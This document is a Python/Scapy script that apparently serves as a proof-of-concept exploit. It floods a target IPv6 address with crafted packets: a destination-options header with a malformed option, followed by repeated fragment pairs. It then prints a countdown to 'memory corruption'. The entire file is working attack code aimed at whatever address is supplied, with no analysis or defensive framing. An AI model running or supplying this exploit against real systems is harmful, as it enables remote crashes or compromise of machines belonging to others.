from scapy.all import *
import argparse
import time

def parse_args():
    parser = argparse.ArgumentParser(description='Send crafted packets with Scapy.')
    parser.add_argument('--iface', type=str, required=True, help='Network interface to use')
    parser.add_argument('--ip', type=str, required=True, help='Destination IP address')
    parser.add_argument('--mac', type=str, help='Destination MAC address (optional)')
    parser.add_argument('--num_tries', type=int, default=20, help='Number of tries (default: 20)')
    parser.add_argument('--num_batches', type=int, default=20, help='Number of batches (default: 20)')
    return parser.parse_args()

args = parse_args()

iface = args.iface
ip_addr = args.ip
mac_addr = args.mac if args.mac else ''
num_tries = args.num_tries
num_batches = args.num_batches

def get_packets_with_mac(i):
    frag_id = 0xdebac1e + i
    first = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / 'aaaaaaaa'
    third = Ether(dst=mac_addr) / IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    return [first, second, third]

def get_packets(i):
    if mac_addr != '':
        return get_packets_with_mac(i)
    frag_id = 0xdebac1e + i
    first = IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)])
    second = IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / 'aaaaaaaa'
    third = IPv6(fl=1, hlim=64+i, dst=ip_addr) / IPv6ExtHdrFragment(id=frag_id, m=0, offset=1)
    return [first, second, third]

final_ps = []
for _ in range(num_batches):
    for i in range(num_tries):
        final_ps += get_packets(i) + get_packets(i)

print("Sending packets")
if mac_addr != '':
    sendp(final_ps, iface)
else:
    send(final_ps, iface)

for i in range(60):
    print(f"Memory corruption will be triggered in {60-i} seconds", end='\r')
    time.sleep(1)
print("")
